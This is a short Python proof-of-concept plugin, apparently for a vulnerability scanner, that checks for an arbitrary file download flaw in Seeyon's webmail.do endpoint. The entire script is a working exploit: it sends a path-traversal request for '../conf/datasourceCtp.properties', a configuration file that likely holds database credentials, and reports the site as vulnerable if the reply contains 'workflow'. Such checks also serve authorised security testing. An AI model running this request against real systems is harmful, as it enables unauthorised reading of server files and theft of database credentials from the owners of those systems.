# -*- coding: utf-8 -*- 

from poc import core
def check(url):
	name='webmail.do任意文件下载'
	core.start_echo(name)
	path='/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties'
	r=core.get(url,path)
	if r:
		if 'workflow' in r.text and r.status_code==200:
			core.end_echo(name,'Payload：'+url+path)
			core.result(name,url+path)
		else:
			core.end_echo(name)
	else:
		core.end_echo(name)
